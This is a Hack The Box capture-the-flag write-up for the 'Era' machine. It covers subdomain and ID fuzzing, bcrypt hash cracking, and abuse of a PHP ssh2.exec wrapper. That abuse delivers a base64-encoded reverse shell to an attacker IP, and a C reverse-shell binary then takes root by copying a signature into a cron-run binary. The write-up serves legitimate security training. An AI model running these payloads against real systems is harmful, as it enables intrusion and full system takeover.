<div align="center">

# Era Machine Write-up

[HTB Machine Certificate](https://labs.hackthebox.com/achievement/machine/2088593/683)

</div>


## Reconnaissance

1. **Starting with nmap. Only ports 21 and 80 are open.**

    ```bash
    ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.79 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) && nmap -p$ports -sC -sV 10.10.11.79   
    ```

        <SNIP>
        PORT   STATE SERVICE VERSION
        21/tcp open  ftp     vsftpd 3.0.5
        80/tcp open  http    nginx 1.18.0 (Ubuntu)
        |_http-title: Did not follow redirect to http://era.htb/
        |_http-server-header: nginx/1.18.0 (Ubuntu)
        Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
        <SNIP>

2. **Upon Analyzing the webpage, no relevant findings were identified, even after reviewing the files, performing directory fuzzing, and inspecting the headers.**

3. **Searching for subdomains, 'file.era.htb’ was found.**

    ```bash
    gobuster vhost -u http://file.era.htb -w /home/lucas/workspace/wordlists/seclist/Discovery/DNS/subdomains-top1million-110000.txt --append-domain -t 50  -a "Mozilla/5.0"
    ```

4. **Upon accessing the page, it was observed that file uploads were allowed. However, authentication was required, including an option to log in using security questions.**

5. **In /login.php the login panel is not vulnerable to sql or nosql injection.**

6. **Manually tried and found the /register.php. A user named ‘test’ was created and logged in.** 

7. **When logging in, menu analysis revealed a page for modifying security questions. Upon accessing this page, it was observed that security question changes are possible username-based. However, further testing could not be performed as other existing usernames were unknown at this time**.

## Exploitation

### IDOR

8. **Upon accessing /upload.php, it was observed that when a file is uploaded, a url is generated with an id parameter. Upon accessing this url, only enables downloading the file associated with the given ID.**

    Attempts to perform path traversal were unsuccessful, as the application was not vulnerable to LFI and consistently returned 403 forbidden. Prior enumeration with ffuf revealed the directories file, file/cache, and file/tmp.

9. **While searching for other files based on ID, two are found: id 54 and 150.**

    A file with 1 to 10k value has been created.

    ```bash
    seq 1 10000 > id.txt
    ```

    Performing the fuzzing:

    ```bash
    ffuf -u 'http://file.era.htb/download.php?id=FUZZ' -w id.txt -H 'Cookie: PHPSESSID=0i5mq1ak9v2po8uoo7j1fb6oja' -fw 3161 -t 100

    54                      [Status: 200, Size: 6378, Words: 2552, Lines: 222, Duration: 1532ms]
    150                     [Status: 200, Size: 6366, Words: 2552, Lines: 222, Duration: 166ms]
    8997                    [Status: 200, Size: 6361, Words: 2552, Lines: 222, Duration: 166ms] 
    ```

    54 = site-backup-30-08-24.zip
    150 = signing.zip

10. **While analysing the found files.** 

    signing.zip found 2 files, a private key and x509.genkey.

    Site-backup-30-08-24.zip The application files are found. Initially filedb.sqlite and security_login.php files drew attention.

11. **Upon access to the sqlite file, the users table was found, containing the bcrypt hashes.**

    ```bash
    sqlite> .tables
    files  users
    sqlite> select * from users;
    1|admin_ef01cab31aa|$2y$10$wDbohsUaezf74d3sMNRPi.o93wDxJqphM2m0VVUp41If6WrYr.QPC |600|Maria|Oliver|Ottawa
    2|eric|$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm|-1|||
    3|veronica|$2y$10$xQmS7JL8UT4B3jAYK7jsNeZ4I.YqaFFnZNA/2GCxLveQ805kuQGOK|-1|||
    4|yuri|$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.|-1|||
    5|john|$2a$10$iccCEz6.5.W2p7CSBOr3ReaOqyNmINMH1LaqeQaL22a1T1V/IddE6|-1|||
    6|ethan|$2a$10$PkV/LAd07ftxVzBHhrpgcOwD3G1omX4Dk2Y56Tv9DpuUV/dh/a1wC|-1|||
    ```

12. **Hashes cracking.**

    ```bash
    hashcat -m 3200 -a 0 hashes.txt /home/lucas/workspace/wordlists/rockyou.txt 
    ```
    eric : america  
    yuri : mustang

### FTP

13. **With ‘yuri’ user it was possible to access the ftp server. Where there were two directories.**

    drwxr-xr-x    2 0        0            4096 Jul 22 08:42 apache2_conf
    drwxr-xr-x    3 0        0            4096 Jul 22 08:42 php8.1_conf

    The apache2_conf contained application configuration files. The only relevant information has Yuri's email address, no other relevant information findings. 

    The php8.1_conf is a directory that contains a list of .so files, PHP extensions. After some research, I learned what these files are. 

    Shared objects (.so) are dynamically linked libraries on Unix-like systems (similar to .dll on Windows). PHP extensions are often compiled into .so files. These libraries provide new functionalities to the PHP core by exposing additional functions, classes, streams, and features.

    When the PHP loads, it enable theses extensions according setup in php.ini or conf.d/*.ini.

    Stream Wrappers are a feature of PHP's Streams API that allow you to access diverse resources (local files, network data, compressed archives, etc.) using a uniform set of functions (like fopen(), fread(), fwrite()). They are implemented as protocols registered with the stream layer and are used as prefixes in a URI-like syntax, for example: file://, http://, php://, ftp://, ssh2.shell://, zip://.

14. **Nothing very relevant in the apache2_conf of the ftp.**

## Initial Access

15. **Upon read the security_login.php file, remember the possibility of logging in using security questions and that this information is available in the sqlite file Maria|Oliver|Ottawa. Nonetheless, it doesn't work. However, by using another user to change the security questions of admin_ef01cab31aa it was possible to  successfully change admin_ef01cab31aa’s, security questions and then log in with this user**. 

16. **While analyzing the downloads.php file an interesting thing was found. A beta functionality available only to the admin user, which, according to the code, is the user with id 1, admin_ef01cab31aa**.

    ```php
    // BETA (Currently only available to the admin) - Showcase file instead of downloading it
    elseif ($_GET['show'] === "true" && $_SESSION['erauser'] === 1) {
    $format = isset($_GET['format']) ? $_GET['format'] : '';
                $file = $fetched[0];

            if (strpos($format, '://') !== false) {
                    $wrapper = $format;
                    header('Content-Type: application/octet-stream');
                } else {
                    $wrapper = '';
                    header('Content-Type: text/html');
                }

                try {
                    $file_content = fopen($wrapper ? $wrapper . $file : $file, 'r');
                $full_path = $wrapper ? $wrapper . $file : $file;
                // Debug Output
                echo "Opening: " . $full_path . "\n";
                    echo $file_content;
                } catch (Exception $e) {
                    echo "Error reading file: " . $e->getMessage();
                }
    ```

    This code is runned only if the user has the id 1, that is admin_ef01cab31aa user and the ‘show’ parameter should be provided in the URL with true value.
    download.php?id=123&show=true

    Next there is another parameter named ‘format’ that can be provided via URL.
    This parameter opens the possibility to use a wrapper, making the verification if the :// string is present in the parameter value. 

    Next concating the wrapper with the file name provided by id. And open the file read-only. 

    Accessing the internal file was not possible, because the code doesn't display its contents in the browser, and it cannot be executed either, as it is read-only.

    Now, know what are php extensions and wrappers  and remember what has been found in the ftp server, in the php8.1_conf folder the file ssh2.so can be used to run ssh via php, call the bash and gain a reverse shell.

    ```bash
    http://file.era.htb/download.php?id=150&show=true&format=ssh2.exec://eric:america@127.0.0.1/bash%20-c%20%27printf%20KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjQvNDQzICAwPiYxKSAm|base64%20-d|bash%27;

## Post-exploration

17. **A reverse shell was obtained with both users, ‘yuri’ and ‘eric’. Initial verification of users permissions showed that ‘eric’ belongs to the ‘devs’ group making this account appear more promising.** 

18. **Initial checks**

    ```bash
    yuri@era:~$ id
    id
    uid=1001(yuri) gid=1002(yuri) groups=1002(yuri)
    
    eric@era:~$ id
    id
    uid=1000(eric) gid=1000(eric) groups=1000(eric),1001(devs)
    ```
    Neither of the users had sudo permissions.

19. **Checking what the ‘devs’ group can do on the system.**

    ```bash
    eric@era:~$ find / -group devs 2>/dev/null
    /opt/AV
    /opt/AV/periodic-checks
    /opt/AV/periodic-checks/monitor
    /opt/AV/periodic-checks/status.log
    ```

    ```bash
    eric@era:~$ ls -la /opt/AV/periodic-checks
    -rwxrw---- 1 root devs 16544 Aug 19 00:25 monitor
    -rw-rw---- 1 root devs   205 Aug 19 00:25 status.log
    ```

    The ‘devs’ group have read and write in both found files. 
    The files have root users like your own, with execution permission in the ‘monitor’ binary.

    The directory name  ‘periodic’, ‘check’ along with file name ‘monitor’, suggests that they are related to a process that runs periodically to monitor something. 


### Process Monitoring

20. **No scheduled cron job was found that runs the ‘monitor’ binary. Then, the ‘pspy’ tool was sent to the target machine and executed to analyze the running process and determine if ‘monitor’ would be executed at some point.**

    ```bash
    ./pspy64 
    2025/08/18 22:03:01 CMD: UID=0     PID=4418   | /usr/sbin/CRON -f -P  
    2025/08/18 22:03:01 CMD: UID=0     PID=4417   | /usr/sbin/CRON -f -P 
    2025/08/18 22:03:01 CMD: UID=0     PID=4419   | 
    2025/08/18 22:03:01 CMD: UID=0     PID=4420   | bash -c echo > /opt/AV/periodic-checks/status.log 
    2025/08/18 22:03:01 CMD: UID=0     PID=4421   | /bin/sh -c bash -c '/root/initiate_monitoring.sh' >> /opt/AV/periodic-checks/status.log 2>&1 
    2025/08/18 22:03:01 CMD: UID=0     PID=4422   | bash -c /root/initiate_monitoring.sh 
    2025/08/18 22:03:01 CMD: UID=0     PID=4423   | objcopy --dump-section .text_sig=text_sig_section.bin /opt/AV/periodic-checks/monitor 
    2025/08/18 22:03:01 CMD: UID=0     PID=4425   | openssl asn1parse -inform DER -in text_sig_section.bin  
    2025/08/19 23:33:01 CMD: UID=0     PID=19813  | /usr/sbin/CRON -f -P 
    2025/08/19 23:33:01 CMD: UID=0     PID=19812  | /usr/sbin/CRON -f -P 
    2025/08/19 23:33:01 CMD: UID=0     PID=19817  | bash -c /root/initiate_monitoring.sh 
    2025/08/19 23:33:01 CMD: UID=0     PID=19816  | /bin/sh -c bash -c '/root/initiate_monitoring.sh' >> /opt/AV/periodic-checks/status.log 2>&1 
    2025/08/19 23:33:01 CMD: UID=0     PID=19814  | 
    2025/08/19 23:33:01 CMD: UID=0     PID=19818  | objcopy --dump-section .text_sig=text_sig_section.bin /opt/AV/periodic-checks/monitor 
    2025/08/19 23:33:01 CMD: UID=0     PID=19819  | /bin/bash /root/initiate_monitoring.sh 
    2025/08/19 23:33:01 CMD: UID=0     PID=19820  | /bin/bash /root/initiate_monitoring.sh 
    2025/08/19 23:33:01 CMD: UID=0     PID=19823  | /bin/bash /root/initiate_monitoring.sh 
    2025/08/19 23:33:01 CMD: UID=0     PID=19822  | 
    2025/08/19 23:33:01 CMD: UID=0     PID=19821  | /bin/bash /root/initiate_monitoring.sh 
    2025/08/19 23:33:01 CMD: UID=0     PID=19824  | /bin/bash /root/initiate_monitoring.sh 
    2025/08/19 23:33:01 CMD: UID=0     PID=19826  | grep -oP (?<=IA5STRING         :)yurivich@era.com 
    2025/08/19 23:33:01 CMD: UID=0     PID=19827  | /bin/bash /root/initiate_monitoring.sh 
    2025/08/19 23:33:04 CMD: UID=0     PID=19830  | /bin/bash /root/initiate_monitoring.sh 
    2025/08/19 23:34:01 CMD: UID=0     PID=19833  | /usr/sbin/CRON -f -P 
    2025/08/19 23:34:01 CMD: UID=0     PID=19835  | /bin/bash /root/initiate_monitoring.sh 
    2025/08/19 23:34:01 CMD: UID=0     PID=19834  | /bin/sh -c bash -c '/root/initiate_monitoring.sh' >> /opt/AV/periodic-checks/status.log 2>&1 
    2025/08/19 23:34:01 CMD: UID=0     PID=19836  | objcopy --dump-section .text_sig=text_sig_section.bin /opt/AV/periodic-checks/monitor 
    2025/08/19 23:34:01 CMD: UID=0     PID=19837  | /bin/bash /root/initiate_monitoring.sh 
    2025/08/19 23:34:01 CMD: UID=0     PID=19838  | /bin/bash /root/initiate_monitoring.sh 
    2025/08/19 23:34:01 CMD: UID=0     PID=19839  | /bin/bash /root/initiate_monitoring.sh 
    2025/08/19 23:34:01 CMD: UID=???   PID=19840  | ???
    2025/08/19 23:34:01 CMD: UID=0     PID=19842  | /bin/bash /root/initiate_monitoring.sh 
    2025/08/19 23:34:01 CMD: UID=0     PID=19844  | grep -oP (?<=IA5STRING         :)yurivich@era.com 
    2025/08/19 23:34:01 CMD: UID=0     PID=19845  | /opt/AV/periodic-checks/monitor 
    2025/08/19 23:34:04 CMD: UID=0     PID=19846  | 
    ```

    <u>Understanding</u>:

    ```
    2025/08/19 23:33:01 CMD: UID=0 PID=19813 | /usr/sbin/CRON -f -P
    ```
    The cron daemon schedules tasks, which means that the scheduled tasks have been triggered.

    ```
    2025/08/18 22:03:01 CMD: UID=0     PID=4420   | bash -c echo > /opt/AV/periodic-checks/status.log 
    ```
    Redirect only a blank line to the file, effectively clears the contents of the status.log file.

    2025/08/19 23:33:01 CMD: UID=0 PID=19817 | bash -c /root/initiate_monitoring.sh
    A bash process is invoked to run the initiate_monitoring script, which is executed from the root directory.

    ```
    2025/08/19 23:33:01 CMD: UID=0 PID=19816 | /bin/sh -c bash -c '/root/initiate_monitoring.sh' >> /opt/AV/periodic-checks/status.log 2>&1
    ```
    Redirect the output of initiate_monitoring.sh to the /opt/AV/periodic-checks/status.log file

    2025/08/19 23:33:01 CMD: UID=0 PID=19818 | objcopy --dump-section .text_sig=text_sig_section.bin /opt/AV/periodic-checks/monitor
    Extract a signature section (.text_sig) from the ‘monitor’ binary into a file.

    ```
    2025/08/19 23:33:01 CMD: UID=0 PID=19819 | /bin/bash /root/initiate_monitoring.sh
    ```
    Subshell running the main script.

    ```
    2025/08/19 23:33:01 CMD: UID=0 PID=19826 | grep -oP (?<=IA5STRING :)yurivich@era.com
    ```
    Extract the email address "yurivich@era.com" from inside the decoded digital signature struct. 
    ‘IA5STRING’ is a data type defined in the ASN.1 standard. It is used to represent character strings (specifically, ASCII characters) within cryptographic structures like digital certificates, keys, and signatures.

    ```
    2025/08/18 22:03:01 CMD: UID=0     PID=4425   | openssl asn1parse -inform DER -in text_sig_section.bin
    ```
    Read and interpret the ‘text_sig_section.bin’ file. 

    ```
    2025/08/19 23:34:01 CMD: UID=0 PID=19845 | /opt/AV/periodic-checks/monitor
    ```
    Ran the ‘monitor’ binary. 

    <u>Diving deeper</u>:

    Some processes appeared at certain times and not at others. Below are the process records from two different moments. Most importantly, they confirm that the ‘monitor’ binary is executed periodically and that it has a signature likely used to verify the file’s integrity.

    Key points to understand:

    The script and binary are executed with root privileges (UID=0). 

    When a program is compiled, the compiler and the linker produce an executable binary file that is meticulously organized into sections, which are grouped into segments.

    Sections have specific names and purposes. _sig is a suffix adopted by convencion as an abbreviation for “signature”.

    A hash of the code in the .text section is generated. This hash is then encrypted with a private key to create a digital signature. Therefore, it is not enough to have the private key to forge the signature, as the signature is derived from both the file content hash and the private key.

    This signature is stored in a special section of the binary itself, such as .text_sig.

## Privilege Escalation

21. **With write privileges on the ‘monitor’ file, it is possible to modify its content to gain a reverse shell with root user.**

21. **A file containing the payload to gain a reverse shell must be created. In this case, a C file, and then sent to the target machine.**

    ```bash
    #include <stdio.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <stdlib.h>
    #include <unistd.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>

    int main(void){
        int port = 443;
        struct sockaddr_in revsockaddr;

        int sockt = socket(AF_INET, SOCK_STREAM, 0);
        revsockaddr.sin_family = AF_INET;       
        revsockaddr.sin_port = htons(port);
        revsockaddr.sin_addr.s_addr = inet_addr("10.10.14.24");

        connect(sockt, (struct sockaddr *) &revsockaddr, 
        sizeof(revsockaddr));
        dup2(sockt, 0);
        dup2(sockt, 1);
        dup2(sockt, 2);

        char * const argv[] = {"sh", NULL};
        execvp("sh", argv);

        return 0;       
    }
    ```

22. **The c file must be compiled.**

    ```bash
    gcc s.c -o s
    ```

23. **The signature of the legitimate binary must be extracted.**

    ```bash
    eric@era:/tmp/.s$ objcopy --dump-section .text_sig=s_sig /opt/AV/periodic-checks/monitor
    <ion .text_sig=s_sig /opt/AV/periodic-checks/monitor
    ```

24. **Inject the extracted signature from the legitimate binary into the malicious created binary.**

    ```bash
    objcopy --add-section .text_sig=s_sig s
    ```

    In this way, the malicious binary now has the same signature as the legitimate binary.

25. **Overwrite the legitimate binary with the malicious binary.**

    ```bash
    cp /tmp/.s/s monitor
    ```

### Root

26. **Wait for the cron job to run the script so that the ‘monitor’ binary is executed with payload and the reverse shell with root user is received.**

    ![][image1]

    [image1]: files/htb-era-machine/image1.png


